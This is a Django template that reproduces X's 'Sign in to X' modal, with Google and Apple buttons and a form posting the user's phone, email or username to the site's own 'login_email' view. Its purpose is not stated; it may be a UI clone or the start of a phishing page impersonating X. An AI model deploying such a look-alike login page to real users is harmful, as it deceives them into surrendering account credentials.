{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X</title>
    <link rel="stylesheet" href="{% static 'login_email.css' %}">
</head>
<body>
    <div class="modal">
        <button class="close-button">âœ•</button>
        <div class="logo">
            <!-- Add your X logo SVG here -->
            <img src="{% static 'logo.svg' %}" alt="X logo">
        </div>
        <h1>Sign in to X</h1>
        
        <button class="signin-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="G">
            Sign in with Google
        </button>
        
        <button class="signin-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo">
            Sign in with Apple
        </button>
        
        <div class="divider">or</div>
        <form method="post" action="{% url 'login_email' %}">
            {% csrf_token %}        
            <input id="username" name="username" type="text" class="input-field" placeholder="Phone, email, or username">
        
            <button type="submit" class="next-button">Next</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>
</body>
</html>
